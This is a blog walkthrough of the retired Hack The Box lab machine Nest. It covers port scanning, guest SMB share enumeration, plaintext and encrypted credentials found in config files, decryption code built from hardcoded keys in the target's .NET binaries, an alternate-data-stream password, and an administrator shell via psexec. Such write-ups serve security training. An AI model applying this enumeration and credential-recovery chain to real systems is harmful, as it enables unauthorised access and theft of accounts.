---
layout: post
title: "Nest: Hack The Box Walkthrough"
date: 2020-06-07 02:54:11 +0000
last_modified_at: 2020-06-07 02:54:11 +0000
category: Walkthrough
tags: ["Hack The Box", Nest, retired, Windows, Easy]
comments: true
image:
  feature: nest-htb-walkthrough.png
---

This post documents the complete walkthrough of Nest, a retired vulnerable [VM][1] created by [VbScrub][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Nest is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.178 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-28 08:39:18 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 4386/tcp on 10.10.10.178
Discovered open port 445/tcp on 10.10.10.178
```

`4386/tcp` looks interesting. I wonder what it it. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p445,4386 -A --reason 10.10.10.178 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 127
4386/tcp open  unknown       syn-ack ttl 127
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     Reporting Service V1.2
|     Unrecognised command
|   Help:
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=1/28%Time=5E2FF41E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLin
SF:es,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognise
SF:d\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x2
SF:0V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comma
SF:nd\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repo
SF:rting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\
SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
SF:\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\
SF:nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCooki
SF:e,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionR
SF:eq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,2
SF:1,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20
SF:command\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r
SF:\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20R
SF:eporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x2
SF:0Reporting\x20Service\x20V1\.2\r\n\r\n>");
```

Interesting stuff going on at `4386/tcp` but I still don't know what service is that. Well, since SMB is available, let's see if there are any file shares worth exploring using `smbmap`.

```
# smbmap -H 10.10.10.178 -u guest -R
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.178...
[+] IP: 10.10.10.178:445        Name: 10.10.10.178
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 21:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 21:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    Shared
        Data                                                    READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 21:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 21:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    Shared
        .\Shared\
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    Templates
        .\Shared\Maintenance\
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    ..
        -r--r--r--               48 Wed Aug  7 19:07:32 2019    Maintenance Alerts.txt
        .\Shared\Templates\
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    Marketing
        .\Shared\Templates\HR\
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    ..
        -r--r--r--              425 Wed Aug  7 22:55:36 2019    Welcome Email.txt
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 NO ACCESS
        .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 15:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 17:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 17:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    TempUser
        Users                                                   READ ONLY
        .\
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 15:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 17:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 17:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    TempUser
```

Let's check out `Maintenance Alerts.txt` and `Welcome Email.txt` like so.

```
# smbclient -Uguest% //10.10.10.178/Data
```

Enter into the respective folders to get them files. First one.

<div class="filename"><span>Maintenance Alerts.txt</span></div>

```
There is currently no scheduled maintenance work
```

And the next one.

<div class="filename"><span>Welcome Email.txt</span></div>

```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

Looks like we have ourselves the first pair of credentials (`TempUser:welcome2019`)! Time to dig deeper into SMB...

```
# smbmap -H 10.10.10.178 -u TempUser -p welcome2019 -R
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.178...
[+] IP: 10.10.10.178:445        Name: 10.10.10.178
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 21:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 21:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    Shared
        Data                                                    READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 22:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 21:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 21:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    Shared
        .\IT\
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    .
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    ..
        dr--r--r--                0 Wed Aug  7 22:58:07 2019    Archive
        dr--r--r--                0 Wed Aug  7 22:59:34 2019    Configs
        dr--r--r--                0 Wed Aug  7 22:08:30 2019    Installs
        dr--r--r--                0 Sun Jan 26 00:09:13 2020    Reports
        dr--r--r--                0 Mon Aug  5 22:33:51 2019    Tools
        .\IT\Configs\
        dr--r--r--                0 Wed Aug  7 22:59:34 2019    .
        dr--r--r--                0 Wed Aug  7 22:59:34 2019    ..
        dr--r--r--                0 Wed Aug  7 19:20:13 2019    Adobe
        dr--r--r--                0 Tue Aug  6 11:16:34 2019    Atlas
        dr--r--r--                0 Tue Aug  6 13:27:08 2019    DLink
        dr--r--r--                0 Wed Aug  7 19:23:26 2019    Microsoft
        dr--r--r--                0 Wed Aug  7 19:33:54 2019    NotepadPlusPlus
        dr--r--r--                0 Wed Aug  7 20:01:13 2019    RU Scanner
        dr--r--r--                0 Tue Aug  6 13:27:09 2019    Server Manager
        .\IT\Configs\Adobe\
        dr--r--r--                0 Wed Aug  7 19:20:13 2019    .
        dr--r--r--                0 Wed Aug  7 19:20:13 2019    ..
        -r--r--r--              246 Wed Aug  7 19:20:13 2019    editing.xml
        -r--r--r--                0 Wed Aug  7 19:20:09 2019    Options.txt
        -r--r--r--              258 Wed Aug  7 19:20:09 2019    projects.xml
        -r--r--r--             1274 Wed Aug  7 19:20:09 2019    settings.xml
        .\IT\Configs\Atlas\
        dr--r--r--                0 Tue Aug  6 11:16:34 2019    .
        dr--r--r--                0 Tue Aug  6 11:16:34 2019    ..
        -r--r--r--             1369 Tue Aug  6 11:18:38 2019    Temp.XML
        .\IT\Configs\Microsoft\
        dr--r--r--                0 Wed Aug  7 19:23:26 2019    .
        dr--r--r--                0 Wed Aug  7 19:23:26 2019    ..
        -r--r--r--             4598 Wed Aug  7 19:23:26 2019    Options.xml
        .\IT\Configs\NotepadPlusPlus\
        dr--r--r--                0 Wed Aug  7 19:33:54 2019    .
        dr--r--r--                0 Wed Aug  7 19:33:54 2019    ..
        -r--r--r--             6451 Wed Aug  7 23:01:25 2019    config.xml
        -r--r--r--             2108 Wed Aug  7 23:00:36 2019    shortcuts.xml
        .\IT\Configs\RU Scanner\
        dr--r--r--                0 Wed Aug  7 20:01:13 2019    .
        dr--r--r--                0 Wed Aug  7 20:01:13 2019    ..
        -r--r--r--              270 Thu Aug  8 19:49:37 2019    RU_config.xml
        .\Shared\
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 19:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    Templates
        .\Shared\Maintenance\
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 19:07:33 2019    ..
        -r--r--r--               48 Wed Aug  7 19:07:32 2019    Maintenance Alerts.txt
        .\Shared\Templates\
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 19:08:07 2019    Marketing
        .\Shared\Templates\HR\
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:10 2019    ..
        -r--r--r--              425 Wed Aug  7 22:55:36 2019    Welcome Email.txt
        IPC$                                                    NO ACCESS       Remote IPC
        .
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 19:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 10:59:25 2019    IT
        Secure$                                                 READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 19:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 23:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 10:59:25 2019    IT
        .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 15:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 17:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 17:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    TempUser
        Users                                                   READ ONLY
        .\
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 15:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 17:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 17:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    TempUser
        .\TempUser\
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    .
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    ..
        -r--r--r--                0 Wed Aug  7 22:56:02 2019    New Text Document.txt
```

Indeed. The new credentials opened doors to more readable files. Who knows what we can find from the configuration files?

<div class="filename"><span>RU_config.xml</span></div>

```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```

We have a `base64`-encoded encrypted password. And this history of opened files in NotepadPlusPlus.

<div class="filename"><span>config.xml</span></div>

```xml
...
<History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
</History>
```

What do we have when we navigate to `//10.10.10.178/Secure$/IT/Carl`?

{% include image.html image_alt="63dd411b.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/63dd411b.png" %}

### Decrypting that "password" in `RU_config.xml`

Opening `Module1.vb` provides us the first clue.

<div class="filename"><span>Module1.vb</span></div>

~~~~vb
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}



    End Sub

End Module
~~~~

Using [.NET Fiddler](https://dotnetfiddle.net/) I was able to decrypt the password with the following Visual Basic code.

~~~~vb
Imports System
Imports System.Text
Imports System.Security.Cryptography

Public Module Module1
	Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function

    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                   ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                               saltValueBytes, _
                                               passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                   ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function

End Class

	Public Sub Main()		
		Dim password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
		Console.WriteLine(password)
	End Sub

End Module
~~~~

{% include image.html image_alt="a76e9bd4.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/a76e9bd4.png" %}

The password is `xRxRxPANCAK3SxRxRx`.

### Getting `user.txt`

Indeed, with `c.smith`'s password we have access to more files, including `user.txt`.

```
Users                                                   READ ONLY
        .\
        dr--r--r--                0 Wed Jan 29 02:00:30 2020    .
        dr--r--r--                0 Wed Jan 29 02:00:30 2020    ..
        dr--r--r--                0 Fri Aug  9 15:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 17:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 17:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 22:56:02 2019    TempUser
        .\C.Smith\
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    .
        dr--r--r--                0 Sun Jan 26 07:21:44 2020    ..
        dr--r--r--                0 Thu Aug  8 23:06:17 2019    HQK Reporting
        -r--r--r--               32 Sun Jan 26 07:21:44 2020    user.txt
        .\C.Smith\HQK Reporting\
        dr--r--r--                0 Thu Aug  8 23:06:17 2019    .
        dr--r--r--                0 Thu Aug  8 23:06:17 2019    ..
        dr--r--r--                0 Fri Aug  9 12:18:42 2019    AD Integration Module
        -r--r--r--                0 Thu Aug  8 23:08:16 2019    Debug Mode Password.txt
        -r--r--r--              249 Thu Aug  8 23:09:05 2019    HQK_Config_Backup.xml
        .\C.Smith\HQK Reporting\AD Integration Module\
        dr--r--r--                0 Fri Aug  9 12:18:42 2019    .
        dr--r--r--                0 Fri Aug  9 12:18:42 2019    ..
        -r--r--r--            17408 Wed Aug  7 23:42:49 2019    HqkLdap.exe
```

{% include image.html image_alt="488d7759.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/488d7759.png" %}

## Privilege Escalation

All that's left is the unknown service at `4386/tcp`. I was able to connect to the service alright.

{% include image.html image_alt="d891442a.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/d891442a.png" %}

One thing to take note is enable CRLF as newline because of _hello_ Microsoft Windows :wink:. Something struck me about the service was the feature to enable debug mode with additional commands.

{% include image.html image_alt="319895d9.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/319895d9.png" %}

Besides the `user.txt`, we also have "Debug Mode Password.txt" above. But it has a size of zero, I hear you asking. Enter the `allinfo` command in `smbclient`.

### Alternate Data Stream

When you see a file having a size of zero but you know something interesting is going on with that file, chances are the interesting data is stored in an alternate data stream or ADS.

{% include image.html image_alt="5176f5bf.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/5176f5bf.png" %}

What do we have here? A data stream of 15 bytes? Let's grab that!

{% include image.html image_alt="6bc4b5d2.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/6bc4b5d2.png" %}

I think we have the DEBUG password.

{% include image.html image_alt="d78bfec3.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/d78bfec3.png" %}

Indeed.

{% include image.html image_alt="87a52fe8.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/87a52fe8.png" %}

It didn't take me long to discover another encrypted password.

{% include image.html image_alt="65fef8ab.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/65fef8ab.png" %}

### Decrypting that "password" in `Ldap.conf`

Earlier on I had a look at `HqkLdap.exe`. It's a .NET executable.

{% include image.html image_alt="43d23337.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/43d23337.png" %}

Using [dnSpy](https://github.com/0xd4d/dnSpy), one can easily "disassemble" a .NET executable.

{% include image.html image_alt="d9f2a6d2.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/d9f2a6d2.png" %}

Similarly, we can decrypt the password in .NET Fiddler with the following code.

~~~~csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace HqkLdap
{
	// Token: 0x02000007 RID: 7
	public class CR
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678
		public static string DS(string EncryptedString)
		{
			if (string.IsNullOrEmpty(EncryptedString))
			{
				return string.Empty;
			}
			return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000022B0 File Offset: 0x000006B0
		public static string ES(string PlainString)
		{
			if (string.IsNullOrEmpty(PlainString))
			{
				return string.Empty;
			}
			return CR.RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022E8 File Offset: 0x000006E8
		private static string RE(string plainText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(initVector);
			byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
			byte[] bytes3 = Encoding.ASCII.GetBytes(plainText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
			byte[] bytes4 = rfc2898DeriveBytes.GetBytes(checked((int)Math.Round((double)keySize / 8.0)));
			ICryptoTransform transform = new AesCryptoServiceProvider
			{
				Mode = CipherMode.CBC
			}.CreateEncryptor(bytes4, bytes);
			string result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes3, 0, bytes3.Length);
					cryptoStream.FlushFinalBlock();
					byte[] inArray = memoryStream.ToArray();
					memoryStream.Close();
					cryptoStream.Close();
					result = Convert.ToBase64String(inArray);
				}
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000023DC File Offset: 0x000007DC
		private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(initVector);
			byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
			byte[] array = Convert.FromBase64String(cipherText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
			checked
			{
				byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
				ICryptoTransform transform = new AesCryptoServiceProvider
				{
					Mode = CipherMode.CBC
				}.CreateDecryptor(bytes3, bytes);
				MemoryStream memoryStream = new MemoryStream(array);
				CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
				byte[] array2 = new byte[array.Length + 1];
				int count = cryptoStream.Read(array2, 0, array2.Length);
				memoryStream.Close();
				cryptoStream.Close();
				return Encoding.ASCII.GetString(array2, 0, count);
			}
		}

		// Token: 0x04000006 RID: 6
		private const string K = "667912";

		// Token: 0x04000007 RID: 7
		private const string I = "1L1SA61493DRV53Z";

		// Token: 0x04000008 RID: 8
		private const string SA = "1313Rf99";
	}

	public class Program
	{
		public static void Main()
		{
			Console.WriteLine(CR.DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
		}
	}
}
~~~~

{% include image.html image_alt="04f5be9c.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/04f5be9c.png" %}

Armed with the administrator's password (`XtH4nkS4Pl4y1nGX`), I guess the end is near. We should be able to get a shell with Impacket's `psexec`.

{% include image.html image_alt="08438af4.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/08438af4.png" %}

Sweet.

### Getting `root.txt`

Time for the prize, yo!

{% include image.html image_alt="ad2a16a2.png" image_src="/f792afdf-35a4-438e-8bf7-f28595f1feb2/ad2a16a2.png" %}

:dancer:

## Afterthoughts

Ain't nobody got time for the unintended way...


[1]: https://www.hackthebox.eu/home/machines/profile/225
[2]: https://www.hackthebox.eu/home/users/profile/158833
[3]: https://www.hackthebox.eu/
